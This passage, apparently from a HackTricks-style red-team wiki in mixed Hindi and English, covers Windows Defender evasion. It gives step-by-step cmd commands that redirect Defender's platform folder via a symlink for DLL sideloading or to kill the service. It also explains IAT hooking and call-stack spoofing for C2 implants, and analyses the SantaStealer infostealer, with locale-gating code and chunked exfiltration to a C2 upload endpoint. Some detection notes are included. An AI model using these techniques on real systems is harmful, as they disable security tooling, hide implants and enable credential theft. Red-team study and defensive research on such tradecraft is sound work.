यह सबसे उच्च लेक्सिकोग्राफ़िक संस्करण स्ट्रिंग वाले सबफ़ोल्डर का चयन करता है (उदा., `4.18.25070.5-0`), फिर वहाँ से Defender सर्विस प्रोसेसेस को शुरू करता है (अनुरूप service/registry paths को अपडेट करते हुए)। यह चयन डायरेक्टरी एंट्रीज़ सहित directory reparse points (symlinks) पर भरोसा करता है। एक administrator इसका लाभ उठाकर Defender को attacker-writable पाथ पर रीडायरेक्ट कर सकता है और DLL sideloading या सर्विस विघटन प्राप्त कर सकता है।

Preconditions
- Local Administrator (Platform फ़ोल्डर के अंतर्गत डायरेक्टरी/symlinks बनाने के लिए आवश्यक)
- रिबूट करने की क्षमता या Defender प्लेटफ़ॉर्म पुन:चयन ट्रिगर करने की क्षमता (सर्विस restart on boot)
- केवल बिल्ट-इन टूल्स आवश्यक (mklink)

Why it works
- Defender अपने स्वयं के फ़ोल्डर्स में लिखने को ब्लॉक करता है, लेकिन उसकी प्लेटफ़ॉर्म चयन डायरेक्टरी एंट्रीज़ पर भरोसा करती है और सबसे उच्च लेक्सिकोग्राफ़िक संस्करण चुनती है बिना यह मान्य किए कि लक्ष्य किसी संरक्षित/विश्वसनीय पाथ पर resolve होता है।

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform के अंदर अपने फ़ोल्डर की ओर इंगित करने वाला एक higher-version directory symlink बनाएं:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) ट्रिगर चयन (reboot recommended):
```cmd
shutdown /r /t 0
```
4) सत्यापित करें कि MsMpEng.exe (WinDefend) पुनर्निर्देशित पथ से चल रहा है:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
आपको नया प्रॉसेस पथ `C:\TMP\AV\` के तहत दिखाई देना चाहिए और सेवा कॉन्फ़िगरेशन/रजिस्ट्री उस स्थान को दर्शाना चाहिए।

Post-exploitation options
- DLL sideloading/code execution: ऐसे DLLs डालें/बदलें जिन्हें Defender अपने application directory से लोड करता है ताकि Defender’s processes में कोड execute हो सके। ऊपर के सेक्शन को देखें: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink को हटाएं ताकि अगली स्टार्ट पर configured path resolve न हो और Defender स्टार्ट होने में विफल हो:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> ध्यान दें कि यह तकनीक अपने आप privilege escalation प्रदान नहीं करती; इसके लिए admin rights की आवश्यकता होती है।

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams runtime evasion को C2 implant से निकालकर target module के अंदर ले जा सकते हैं, इसके Import Address Table (IAT) को hook करके और चुनी हुई APIs को attacker-controlled, position‑independent code (PIC) के माध्यम से route करके। यह evasion को उन छोटे API surface से परे सामान्यीकृत करता है जिन्हें कई kits expose करते हैं (उदा., CreateProcessA), और समान protections BOFs और post‑exploitation DLLs तक फैलाता है।

High-level approach
- Reflective loader का उपयोग करके target module के साथ एक PIC blob stage करें (prepended या companion)। PIC self‑contained और position‑independent होना चाहिए।
- जब host DLL load हो रहा हो, उसके IMAGE_IMPORT_DESCRIPTOR को walk करें और targeted imports के लिए IAT entries को patch करें (उदा., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ताकि वे thin PIC wrappers की ओर इशारा करें।
- प्रत्येक PIC wrapper वास्तविक API address को tail‑call करने से पहले evasions को execute करता है। Typical evasions में शामिल हैं:
- Memory mask/unmask call के चारों ओर (उदा., encrypt beacon regions, RWX→RX, page names/permissions बदलना) और फिर call के बाद restore।
- Call‑stack spoofing: एक benign stack बनाकर target API में transition करें ताकि call‑stack analysis अपेक्षित frames को resolve करे।
- Compatibility के लिए एक interface export करें ताकि एक Aggressor script (या समकक्ष) यह register कर सके कि Beacon, BOFs और post‑ex DLLs के लिए कौन‑सी APIs hook करनी हैं।

Why IAT hooking here
- यह किसी भी code के लिए काम करता है जो hooked import का उपयोग करता है, बिना tool code को modify किए या Beacon पर specific APIs को proxy करने पर निर्भर हुए।
- post‑ex DLLs को कवर करता है: LoadLibrary* को hook करने से आप module loads (उदा., System.Management.Automation.dll, clr.dll) intercept कर सकते हैं और उनके API calls पर वही masking/stack evasion लागू कर सकते हैं।
- CreateProcessA/W को wrap करके call‑stack–based detections के खिलाफ process‑spawning post‑ex commands के विश्वसनीय उपयोग को पुनर्स्थापित करता है।

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- पैच को relocations/ASLR के बाद और import के पहले उपयोग से पहले लागू करें। Reflective loaders जैसे TitanLdr/AceLdr लोड किए गए मॉड्यूल के DllMain के दौरान hooking प्रदर्शित करते हैं।
- रैपर छोटे और PIC-safe रखें; असली API को उस मूल IAT वैल्यू के माध्यम से resolve करें जिसे आपने पैच करने से पहले कैप्चर किया था या LdrGetProcedureAddress के माध्यम से।
- PIC के लिए RW → RX ट्रांज़िशन का उपयोग करें और writable+executable पेज्स न छोड़ें।

Call‑stack spoofing stub
- Draugr‑style PIC stubs एक नकली call chain बनाते हैं (return addresses benign मॉड्यूल्स में) और फिर वास्तविक API में pivot करते हैं।
- यह उन detections को विफल करता है जो Beacon/BOFs से sensitive APIs के लिए canonical stacks की अपेक्षा करते हैं।
- इसे stack cutting/stack stitching techniques के साथ जोड़ें ताकि API prologue से पहले अपेक्षित फ्रेम्स के अंदर आ सकें।

Operational integration
- पोस्ट‑ex DLLs में reflective loader को prepend करें ताकि PIC और hooks DLL लोड होने पर स्वतः initialise हो जाएँ।
- target APIs को register करने के लिए Aggressor script का उपयोग करें ताकि Beacon और BOFs बिना कोड बदलने के भी उसी evasion path से पारदर्शी रूप से लाभान्वित हों।

Detection/DFIR considerations
- IAT integrity: ऐसे एंट्रियाँ जो non‑image (heap/anon) पतों को resolve करती हैं; import pointers का periodic verification।
- Stack anomalies: ऐसे return addresses जो loaded images से संबंधित नहीं हैं; non‑image PIC में अचानक transitions; असंगत RtlUserThreadStart ancestry।
- Loader telemetry: IAT पर इन‑प्रोसेस writes, import thunks में बदलाव करने वाली early DllMain activity, लोड के समय बनाए गए अनपेक्षित RX regions।
- Image‑load evasion: अगर hooking LoadLibrary* किया जा रहा है, तो memory masking events के साथ correlated suspicious loads of automation/clr assemblies की निगरानी करें।

Related building blocks and examples
- Reflective loaders जो load के दौरान IAT patching करते हैं (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) और stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer के Tradecraft — Fileless Evasion और Credential Theft के लिए

SantaStealer (aka BluelineStealer) दिखाता है कि आधुनिक info-stealers कैसे AV bypass, anti-analysis और credential access को एक एकीकृत workflow में मिलाते हैं।

### Keyboard layout gating & sandbox delay

- एक config flag (`anti_cis`) इंस्टॉल किए गए keyboard layouts को `GetKeyboardLayoutList` के माध्यम से enumerate करता है। अगर कोई Cyrillic layout मिलता है, तो सैंपल एक खाली `CIS` मार्कर छोड़ता है और stealers चलाने से पहले terminate कर जाता है, जिससे यह सुनिश्चित होता है कि यह excluded locales पर कभी detonate न करे जबकि hunting artifact छोड़ दे।
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### परतदार `check_antivm` लॉजिक

- Variant A प्रक्रिया सूची को स्कैन करती है, प्रत्येक नाम का एक कस्टम रोलिंग चेकसम से हैश बनाती है, और इसे डिबगर/सैंडबॉक्स के एम्बेडेड ब्लॉकलिस्ट से मिलाती है; यह चेकसम कंप्यूटर नाम पर भी दोहराती है और काम करने वाली डायरेक्टरीज़ जैसे `C:\analysis` को चेक करती है।
- Variant B सिस्टम गुणों (process-count floor, हालिया uptime) का निरीक्षण करती है, `OpenServiceA("VBoxGuest")` को कॉल करके VirtualBox additions का पता लगाती है, और single-stepping पकड़ने के लिए स्लीप के आसपास टाइमिंग चेक करती है। किसी भी हिट पर मॉड्यूल लॉन्च होने से पहले ही प्रक्रिया रद्द कर दी जाती है।

### Fileless helper + double ChaCha20 reflective loading

- प्राथमिक DLL/EXE में एक Chromium credential helper एम्बेड होता है जिसे या तो डिस्क पर drop किया जाता है या मैन्युअली इन‑मेमोरी map किया जाता है; fileless मोड imports/relocations खुद resolve कर लेता है इसलिए कोई helper artifacts लिखे नहीं जाते।
- वह helper एक second-stage DLL को ChaCha20 से दो बार एन्क्रिप्ट करके स्टोर करता है (दो 32‑byte keys + 12‑byte nonces)। दोनों पास के बाद, यह blob को reflectively लोड करता है (कोई `LoadLibrary` नहीं) और एक्सपोर्ट्स `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` को कॉल करता है जो [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) से व्युत्पन्न हैं।
- ChromElevator रूटीन direct-syscall reflective process hollowing का उपयोग करके एक लाइव Chromium browser में inject करती हैं, AppBound Encryption keys को inherit करती हैं, और ABE hardening के बावजूद SQLite databases से सीधे passwords/cookies/credit cards को decrypt कर लेती हैं।

### मॉड्यूलर इन‑मेमोरी कलेक्शन और chunked HTTP exfil

- `create_memory_based_log` एक global `memory_generators` function-pointer table पर iterate करता है और हर enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, आदि) के लिए एक thread spawn करता है। हर thread परिणामों को shared buffers में लिखता है और लगभग 45s के join विंडो के बाद अपनी file count रिपोर्ट करता है।
- समाप्त होने पर, सब कुछ statically linked `miniz` library के साथ `%TEMP%\\Log.zip` के रूप में zip किया जाता है। `ThreadPayload1` फिर 15s के लिए sleep करता है और archive को 10 MB chunks में HTTP POST के जरिए `http://<C2>:6767/upload` पर stream करता है, ब्राउज़र `multipart/form-data` boundary (`----WebKitFormBoundary***`) की नकल करते हुए। हर chunk में `User-Agent: upload`, `auth: <build_id>`, वैकल्पिक `w: <campaign_tag>` जोड़ा जाता है, और आखिरी chunk में `complete: true` जोड़ दिया जाता है ताकि C2 को पता चल जाए कि reassembly पूरा हो गया है।

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

{{#include ../banners/hacktricks-training.md}}
